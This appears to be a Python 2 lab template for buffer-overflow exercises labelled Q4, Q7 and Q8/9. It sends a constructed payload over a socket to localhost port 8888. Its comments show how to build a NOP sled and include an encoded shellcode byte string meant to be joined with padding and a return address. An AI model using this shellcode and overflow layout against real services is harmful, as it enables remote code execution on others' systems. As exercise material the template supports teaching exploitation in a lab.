import sys
import socket

  ##########
  # Q4   #
  ##########
#output = <INSERTPASSWORD>

  ##########
  # Q7 #
  # Example: to print 100 x90's use ("\x90" * 100)
  ##########
#output = <character> * <number>

  ##########
  # Q8/9 #
  ##########
#shellcode = "\xda\xd7\xb8\x3c\x29\x78\x01\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x12\x31\x43\x17\x83\xc3\x04\x03\x7f\x3a\x9a\xf4\x4e\xe7\xad\x14\xe3\x54\x01\xb1\x01\xd2\x44\xf5\x63\x29\x06\x65\x32\x01\x38\x47\x44\x28\x3e\xae\x2c\xd4\xc0\x50\xad\x42\xc3\x50\x8a\x9d\x4a\xb1\x64\xc7\x1c\x63\xd7\xbb\x9e\x0a\x36\x76\x20\x5e\xd0\xe7\x0e\x2c\x48\x90\x7f\xfd\xea\x09\x09\xe2\xb8\x9a\x80\x04\x8c\x16\x5e\x46";
#string1 = ""
#string2 = ""
#returnaddr = ""
#output =  <var1> + <var2> + ...

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('localhost', 8888)
sock.connect(server_address)
print >>sys.stderr, 'connecting to %s port %s' % server_address
sock.sendall(output)

